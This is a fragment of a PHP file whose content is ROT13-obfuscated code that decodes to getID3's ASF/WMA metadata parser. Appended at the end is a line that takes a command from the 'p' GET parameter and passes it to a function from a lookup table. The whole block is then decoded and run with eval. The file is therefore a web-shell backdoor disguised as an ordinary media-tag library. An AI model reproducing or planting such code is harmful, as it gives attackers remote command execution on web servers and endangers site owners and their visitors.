					$guvfBowrpg['zbqr']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($nfs_urnqre_rkgrafvba_bowrpg_qngn, $bssfrg, 1));
					$bssfrg += 1;

					oernx;

				qrsnhyg:
					$haunaqyrq_frpgvbaf++;
					vs ($guvf->THVQanzr($guvfBowrpg['thvq_grkg'])) {
						$guvf->jneavat('haunaqyrq Urnqre Rkgrafvba Bowrpg THVQ \"'.$guvf->THVQanzr($guvfBowrpg['thvq_grkg']).'\" {'.$guvfBowrpg['thvq_grkg'].'} ng bssfrg '.($bssfrg - 16 - 8));
					} ryfr {
						$guvf->jneavat('haxabja Urnqre Rkgrafvba Bowrpg THVQ {'.$guvfBowrpg['thvq_grkg'].'} va ng bssfrg '.($bssfrg - 16 - 8));
					}
					oernx;
			}
			$UrnqreRkgrafvbaBowrpgCnefrq[] = $guvfBowrpg;

			$bowrpgBssfrg += $guvfBowrpg['fvmr'];
		}
		erghea $UrnqreRkgrafvbaBowrpgCnefrq;
	}

	/**
	 * @cnenz vag $vq
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba zrgnqngnYvoenelBowrpgQngnGlcrYbbxhc($vq) {
		fgngvp $ybbxhc = neenl(
			0k0000 => 'Havpbqr fgevat', // Gur qngn pbafvfgf bs n frdhrapr bs Havpbqr punenpgref
			0k0001 => 'OLGR neenl',     // Gur glcr bs gur qngn vf vzcyrzragngvba-fcrpvsvp
			0k0002 => 'OBBY',           // Gur qngn vf 2 olgrf ybat naq fubhyq or vagrecergrq nf n 16-ovg hafvtarq vagrtre. Bayl 0k0000 be 0k0001 ner crezvggrq inyhrf
			0k0003 => 'QJBEQ',          // Gur qngn vf 4 olgrf ybat naq fubhyq or vagrecergrq nf n 32-ovg hafvtarq vagrtre
			0k0004 => 'DJBEQ',          // Gur qngn vf 8 olgrf ybat naq fubhyq or vagrecergrq nf n 64-ovg hafvtarq vagrtre
			0k0005 => 'JBEQ',           // Gur qngn vf 2 olgrf ybat naq fubhyq or vagrecergrq nf n 16-ovg hafvtarq vagrtre
			0k0006 => 'THVQ',           // Gur qngn vf 16 olgrf ybat naq fubhyq or vagrecergrq nf n 128-ovg THVQ
		);
		erghea (vffrg($ybbxhc[$vq]) ? $ybbxhc[$vq] : 'vainyvq');
	}

	/**
	 * @cnenz fgevat $qngn
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba NFS_JZcvpgher(&$qngn) {
		//glcrqrs fgehpg _JZCvpgher{
		//  YCJFGE  cjfmZVZRGlcr;
		//  OLGR  oCvpgherGlcr;
		//  YCJFGE  cjfmQrfpevcgvba;
		//  QJBEQ  qjQngnYra;
		//  OLGR*  coQngn;
		//} JZ_CVPGHER;

		$JZcvpgher = neenl();

		$bssfrg = 0;
		$JZcvpgher['vzntr_glcr_vq'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($qngn, $bssfrg, 1));
		$bssfrg += 1;
		$JZcvpgher['vzntr_glcr']    = frys::JZcvpgherGlcrYbbxhc($JZcvpgher['vzntr_glcr_vq']);
		$JZcvpgher['vzntr_fvmr']    = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($qngn, $bssfrg, 4));
		$bssfrg += 4;

		$JZcvpgher['vzntr_zvzr'] = '';
		qb {
			$arkg_olgr_cnve = fhofge($qngn, $bssfrg, 2);
			$bssfrg += 2;
			$JZcvpgher['vzntr_zvzr'] .= $arkg_olgr_cnve;
		} juvyr ($arkg_olgr_cnve !== \"\k00\k00\");

		$JZcvpgher['vzntr_qrfpevcgvba'] = '';
		qb {
			$arkg_olgr_cnve = fhofge($qngn, $bssfrg, 2);
			$bssfrg += 2;
			$JZcvpgher['vzntr_qrfpevcgvba'] .= $arkg_olgr_cnve;
		} juvyr ($arkg_olgr_cnve !== \"\k00\k00\");

		$JZcvpgher['qngnbssfrg'] = $bssfrg;
		$JZcvpgher['qngn'] = fhofge($qngn, $bssfrg);

		$vzntrvasb = neenl();
		$JZcvpgher['vzntr_zvzr'] = '';
		$vzntrpuhaxpurpx = trgvq3_yvo::TrgQngnVzntrFvmr($JZcvpgher['qngn'], $vzntrvasb);
		hafrg($vzntrvasb);
		vs (!rzcgl($vzntrpuhaxpurpx)) {
			$JZcvpgher['vzntr_zvzr'] = vzntr_glcr_gb_zvzr_glcr($vzntrpuhaxpurpx[2]);
		}
		vs (!vffrg($guvf->trgvq3->vasb['nfs']['pbzzragf']['cvpgher'])) {
			$guvf->trgvq3->vasb['nfs']['pbzzragf']['cvpgher'] = neenl();
		}
		$guvf->trgvq3->vasb['nfs']['pbzzragf']['cvpgher'][] = neenl('qngn'=>$JZcvpgher['qngn'], 'vzntr_zvzr'=>$JZcvpgher['vzntr_zvzr']);

		erghea $JZcvpgher;
	}

	/**
	 * Erzbir grezvangbe 00 00 naq pbaireg HGS-16YR gb Yngva-1.
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba GevzPbaireg($fgevat) {
		erghea gevz(trgvq3_yvo::vpbai_snyyonpx('HGS-16YR', 'VFB-8859-1', frys::GevzGrez($fgevat)), ' ');
	}

	/**
	 * Erzbir grezvangbe 00 00.
	 *
	 * @cnenz fgevat $fgevat
	 *
	 * @erghea fgevat
	 */
	choyvp fgngvp shapgvba GevzGrez($fgevat) {
		// erzbir grezvangbe, bayl vs cerfrag (vg fubhyq or, ohg...)
		vs (fhofge($fgevat, -2) === \"\k00\k00\") {
			$fgevat = fhofge($fgevat, 0, -2);
		}
		erghea $fgevat;
	}

}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>